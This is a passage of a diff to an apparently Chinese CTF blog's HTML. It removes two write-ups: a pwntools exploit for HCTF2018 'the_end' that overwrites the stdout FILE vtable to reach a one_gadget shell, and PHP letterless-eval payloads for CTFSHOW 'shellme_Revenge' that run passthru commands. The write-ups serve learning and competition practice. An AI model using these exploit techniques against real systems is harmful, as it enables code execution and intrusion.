class="line"></span><br><span class="line">  sleep(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;here is a gift %p, good luck ;)\n&quot;</span>, &amp;sleep);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i ) &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1337</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>6#</code>直接泄露libc基地址    <code>10#</code>任意地址写5个字节   </p>
-<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>开了 <strong>Full RELRO</strong>, got表写不了   也没有栈溢出  (要写返回地址也是一种可能  但是因为不知道栈地址  相当于四个字节的随机化  实现概率太小)</p>
-<p>程序调用 <code>exit</code> 后，会调用 <code>_IO_2_1_stdout_</code> 下的 <code>vtable</code> 中 <code>_setbuf</code> 函数  可以改写<code>vtable</code>为<code>fake_vtable</code>（可写的区域）  然后改写对应<code>_setbuf</code>偏移处的函数指针为<code>one_gadget</code></p>
-<p>注意由于<code>8#</code>关闭了输出流，执行 <code>exec /bin/sh 1&gt;&amp;0</code> 重定向 使输出可见</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./the_end&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    pie b 0x000000000000093F</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;gift &#x27;</span>)	<span class="comment"># 获取libc基地址</span></span><br><span class="line">libc_base = <span class="built_in">int</span>(ru(<span class="string">b&#x27;,&#x27;</span>).strip(<span class="string">b&#x27;,&#x27;</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;sleep&#x27;</span>]</span><br><span class="line">ls(<span class="string">&quot;libc base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">io_stdout = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">vtable_addr = libc_base + <span class="number">0x3C56F8</span>	<span class="comment"># vtable存放地址</span></span><br><span class="line">fake_vtable = libc_base + <span class="number">0x3C56c0</span>	</span><br><span class="line">gadget = libc_base + one_gadgets[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">li(<span class="string">&quot;vtable_addr: &quot;</span> + <span class="built_in">hex</span>(vtable_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):	<span class="comment"># 将fake_vtable写入原vtable存放处</span></span><br><span class="line">    s(p64(vtable_addr + i))</span><br><span class="line">    s(p8(p64(fake_vtable)[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):	<span class="comment"># 修改fake_vtable + 0x58函数（原vtable中的setbuf）地址为one_gadget</span></span><br><span class="line">    s(p64(fake_vtable + <span class="number">0x58</span> + i))</span><br><span class="line">    s(p8(p64(gadget)[i]))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&quot;exec /bin/sh 1&gt;&amp;0&quot;</span>)	<span class="comment"># 重定向使输出可见</span></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>参考：<a target="_blank" rel="noopener" href="https://blog.wingszeng.top/pwn-file-exploitation-fake-vtable">https://blog.wingszeng.top/pwn-file-exploitation-fake-vtable</a><br><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/fake-vtable-exploit/#2018-hctf-the_end">https://ctf-wiki.org/pwn/linux/user-mode/io-file/fake-vtable-exploit/#2018-hctf-the_end</a></p>
-</blockquote>
-
-	
-	</div>
-  <a type="button" href="/2023/09/16/HCTF2018-theEnd-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/09/12/CTFSHOW-shellmeRevenge-wp/" >CTFSHOW-shellmeRevenge-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-09-12
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://ctf.show/challenges#shellme_Revenge-1483">题目链接</a>   </p>
-<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><p>进入页面看到<code>phpinfo</code>  php版本为<code>7.2.34</code>  再看到被禁用的函数<code>disable_function</code></p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/09/12/CTFSHOW-shellmeRevenge-wp/0x1.png?raw=true" alt="m"></p>
-<p>发现 system, exec, shell_exec等都被禁用，但没有过滤<code>passthru</code></p>
-<p>查看网络流  发现包头的cookie中有hint: <code>?looklook</code>  url加上?looklook&#x3D;1可以得到源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">107</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这里发现过滤了除<code>C</code>以外的字母  除<code>0-3</code>以外的数字</p>
-<p><code>^</code>被过滤  用不了异或；<code>~</code>被过滤  用不了取反   两个引号都被过滤</p>
-<h2 id="0x2-exp"><a href="#0x2-exp" class="headerlink" title="0x2 exp"></a>0x2 exp</h2><p>这里考虑自增   这里不知道是不是作者弄错了第10行中的判断条件用的是<code>||</code>  所以就算长度超了107也没事  那我们先不管长度  用自增构造<code>$_GET[1]($_GET[2])</code></p>
-<p>注意因为过滤了引号   直接<code>$a._</code>也可以实现连接  但调试的话php版本最好也是7.2  高版本这种操作可能不行</p>
-<h3 id="长度不限"><a href="#长度不限" class="headerlink" title="长度不限"></a>长度不限</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[]._;	</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;	<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;	<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;	<span class="comment">//G</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;	<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="comment">//_GET</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_</span>;	<span class="comment">// _GET</span></span><br><span class="line"><span class="comment">// $$_[1]($$_[2]));</span></span><br><span class="line"><span class="comment">// $_GET[1]($_GET[2])</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>去掉换行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[]._;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>];<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="variable">$_</span>=_.<span class="variable">$_</span>;<span class="variable">$$_</span>[<span class="number">1</span>](<span class="variable">$$_</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>
-
-<p>URL编码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ?looklook=1&amp;1=passthru&amp;2=ls /</span></span><br><span class="line">ctf_show=%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D._%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">5</span>B0%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>___.%<span class="number">24</span>__.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D_.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B1%<span class="number">5</span>D(%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B2%<span class="number">5</span>D)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure>
-
-<p>成功执行</p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/09/12/CTFSHOW-shellmeRevenge-wp/0x2.png?raw=true" alt="m"></p>
-<h3 id="长度-lt-x3D-107"><a href="#长度-lt-x3D-107" class="headerlink" title="长度&lt;&#x3D;107"></a>长度&lt;&#x3D;107</h3><p>如果<code>10#</code>中的<code>||</code>换成<code>&amp;&amp;</code>的话  就需要压缩我们的payload了</p>
-<p>思路：<code>C -&gt; E -&gt; G</code>        <code>T</code>离得比较远 可以通过<code>C/C.C</code>获取到<code>NANC</code>进而  <code>N-&gt;T</code>  </p>
-<p><strong>这里</strong>可能有人会想为什么不从<code>Array</code>当中取出<code>r</code>然后到<code>t</code>呢 ？ php对于函数名类名大小写不敏感  但是对于<code>$_GET, $_POST</code>这一类变量是大小写敏感的  所以构造出的<code>$_GEt</code>发挥不了作用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$C</span>=(C/C.C)[<span class="number">0</span>];	<span class="comment">// N</span></span><br><span class="line"><span class="variable">$C</span>++;<span class="variable">$C</span>++;<span class="variable">$C</span>++;<span class="variable">$C</span>++;<span class="variable">$C</span>++;	<span class="comment">// S，不直接到T  下面拼接的时候行内自增</span></span><br><span class="line"><span class="variable">$_</span>=C;	</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;	<span class="comment">// E</span></span><br><span class="line"><span class="variable">$C</span>=<span class="variable">$_</span>.++<span class="variable">$C</span>;		<span class="comment">// ET</span></span><br><span class="line"><span class="variable">$_</span>++;	<span class="comment">// F	与第2行逻辑相同</span></span><br><span class="line"><span class="variable">$_</span>=_.++<span class="variable">$_</span>.<span class="variable">$C</span>;	<span class="comment">// _GET</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $C=(C/C.C)[0];$C++;$C++;$C++;$C++;$C++;$_=C;$_++;$_++;$C=$_.++$C;$_++;$_=_.++$_.$C;$$_[1]($$_[2]);</span></span><br><span class="line"><span class="comment">// strlen=98</span></span><br></pre></td></tr></table></figure>
-
-<p>更小：直接<code>N -&gt; O -&gt; P -&gt; S -&gt; T</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(_/_._)[<span class="number">0</span>];	<span class="comment">// N</span></span><br><span class="line">++<span class="variable">$_</span>;	<span class="comment">// O</span></span><br><span class="line"><span class="variable">$__</span>=_.<span class="variable">$_</span>.<span class="variable">$_</span>++;		<span class="comment">// _PO</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>.++<span class="variable">$_</span>.++<span class="variable">$_</span>;	<span class="comment">// _POST</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $_=(_/_._)[0];$__=++$_;$__=_.++$_.$__;$_++;$_++;$_=$__.++$_.++$_;$$_[0]($$_[1]);</span></span><br><span class="line"><span class="comment">// strlen=80   注意这里是POST了 跟GET传参方式不同</span></span><br></pre></td></tr></table></figure>
-
-<p>再压缩：将<code>_POST</code>作为POST的参数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(_/_._)[_];                     <span class="comment">// N  注意这里的索引0有的php版本下也可以替换为非数字字符</span></span><br><span class="line">++<span class="variable">$_</span>;                              </span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++;                       <span class="comment">// PO</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;                         </span><br><span class="line"><span class="variable">$$_</span>[<span class="variable">$_</span>=_.<span class="variable">$__</span>.++<span class="variable">$_</span>.++<span class="variable">$_</span>](<span class="variable">$$_</span>[_]);   <span class="comment">// $$_[_POST]($$_[_])即$_POST[]($_POST[_])</span></span><br><span class="line"><span class="comment">// $_=(_/_._)[_];++$_;$__=$_.$_++;++$_;++$_;$$_[$_=_.$__.++$_.++$_]($$_[_]);</span></span><br><span class="line"><span class="comment">// strlen=73 		POST  _=ls&amp;_POST=passthru</span></span><br></pre></td></tr></table></figure>
-
-<p>删去换行 url编码后同样可以实现功能</p>
-<p>几个压缩点：</p>
-<ol>
-<li>行内自增完直接用就是新的值：<code>$C=$_.++$C;</code> </li>
-<li>多字符串一行拼接<code>$_=_.++$_.$C;</code></li>
-<li>找就近字母递增，过程中有遇到符合的记录下，不每次从头开始</li>
-<li><code>_/_, 0/0, C/C</code>都可以得到<code>NAN</code></li>
-<li><code>[0], [&#39;&#39;==&#39;.&#39;], [_]</code>都有可能起到同样作用</li>
-</ol>
-
-	
-	</div>
-  <a type="button" href="/2023/09/12/CTFSHOW-shellmeRevenge-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -759,7 +767,7 @@
 		
 			<li><a href="/categories/pwn-learning/">pwn-learning<span>5</span></a></li>
 		
-			<li><a href="/categories/pwn-wp/">pwn-wp<span>18</span></a></li>
+			<li><a href="/categories/pwn-wp/">pwn-wp<span>19</span></a></li>
 		
 			<li><a href="/categories/reverse-learning/">reverse-learning<span>1</span></a></li>
 		
@@ -767,7 +775,7 @@
 		
 			<li><a href="/categories/web-learning/">web-learning<span>4</span></a></li>
 		
-			<li><a href="/categories/web-wp/">web-wp<span>43</span></a></li>
+			<li><a href="/categories/web-wp/">web-wp<span>45</span></a></li>
 		
 		</ul>
 	</div>
@@ -778,48 +786,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/file-include/">file_include<span>3</span></a></li>
-		
-			<li><a href="/tags/flask-session/">flask session<span>2</span></a></li>
-		
-			<li><a href="/tags/decrypt/">decrypt<span>1</span></a></li>
-		
-			<li><a href="/tags/Backdoorctf2017/">Backdoorctf2017<span>1</span></a></li>
-		
-			<li><a href="/tags/D3CTF2019/">D3CTF2019<span>1</span></a></li>
-		
-			<li><a href="/tags/index/">index<span>1</span></a></li>
-		
 			<li><a href="/tags/无字母命令执行/">无字母命令执行<span>1</span></a></li>
 		
-			<li><a href="/tags/网鼎杯2018/">网鼎杯2018<span>1</span></a></li>
+			<li><a href="/tags/ret2libc/">ret2libc<span>2</span></a></li>
 		
-			<li><a href="/tags/js/">js<span>1</span></a></li>
+			<li><a href="/tags/GKCTF2021/">GKCTF2021<span>1</span></a></li>
 		
-			<li><a href="/tags/heap/">heap<span>4</span></a></li>
+			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
 		
-			<li><a href="/tags/BJDCTF2020/">BJDCTF2020<span>1</span></a></li>
+			<li><a href="/tags/privilege-escalation/">privilege escalation<span>1</span></a></li>
 		
-			<li><a href="/tags/无参函数构造rce/">无参函数构造rce<span>1</span></a></li>
+			<li><a href="/tags/ret2syscall/">ret2syscall<span>2</span></a></li>
 		
-			<li><a href="/tags/HS2019/">HS2019<span>1</span></a></li>
-		
-			<li><a href="/tags/upload/">upload<span>4</span></a></li>
+			<li><a href="/tags/canary/">canary<span>3</span></a></li>
 		
 			<li><a href="/tags/zer0pts2020/">zer0pts2020<span>1</span></a></li>
 		
-			<li><a href="/tags/redis/">redis<span>1</span></a></li>
+			<li><a href="/tags/LitCTF2023/">LitCTF2023<span>2</span></a></li>
 		
-			<li><a href="/tags/HDCTF2023/">HDCTF2023<span>1</span></a></li>
+			<li><a href="/tags/partial-overwrite/">partial overwrite<span>1</span></a></li>
 		
-			<li><a href="/tags/pesudoProtocol/">pesudoProtocol<span>2</span></a></li>
+			<li><a href="/tags/DASCTF2023/">DASCTF2023<span>1</span></a></li>
 		
-			<li><a href="/tags/无回显rce/">无回显rce<span>1</span></a></li>
+			<li><a href="/tags/HCTF2016/">HCTF2016<span>1</span></a></li>
 		
-			<li><a href="/tags/stack/">stack<span>10</span></a></li>
+			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
+		
+			<li><a href="/tags/SwampCTF2019/">SwampCTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/CTFSHOW/">CTFSHOW<span>2</span></a></li>
+		
+			<li><a href="/tags/csawquals2017/">csawquals2017<span>1</span></a></li>
+		
+			<li><a href="/tags/dcquals2016/">dcquals2016<span>1</span></a></li>
+		
+			<li><a href="/tags/极客大挑战2020/">极客大挑战2020<span>1</span></a></li>
+		
+			<li><a href="/tags/De1ctf2019/">De1ctf2019<span>1</span></a></li>
+		
+			<li><a href="/tags/HCTF2018/">HCTF2018<span>1</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>101</span></a></li>
+		   <li><a href="/tags">...<span>103</span></a></li>
 		 
 		</ul>
 	</div>
@@ -832,6 +840,14 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/10/13/HNCTF2022-easyInclude-wp/" ><i class="fa fa-file-o"></i>HNCTF2022-easy_include-wp</a>
+      </li>
+    
+      <li>
+        <a href="/2023/10/10/dcquals2019-speedrun-wp/" ><i class="fa fa-file-o"></i>nightmare 7.2.1.dcquals2019...</a>
+      </li>
+    
+      <li>
         <a href="/2023/10/10/极客大挑战2020-rceme-wp/" ><i class="fa fa-file-o"></i>极客大挑战2020-rceme-wp</a>
       </li>
     
@@ -841,14 +857,6 @@
     
       <li>
         <a href="/2023/09/29/StarCTF2018-note-wp/" ><i class="fa fa-file-o"></i>StarCTF2018-note-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/09/28/CTFSHOW-extremeRCE-wp/" ><i class="fa fa-file-o"></i>CTFSHOW 极限命令执行 wp</a>
-      </li>
-    
-      <li>
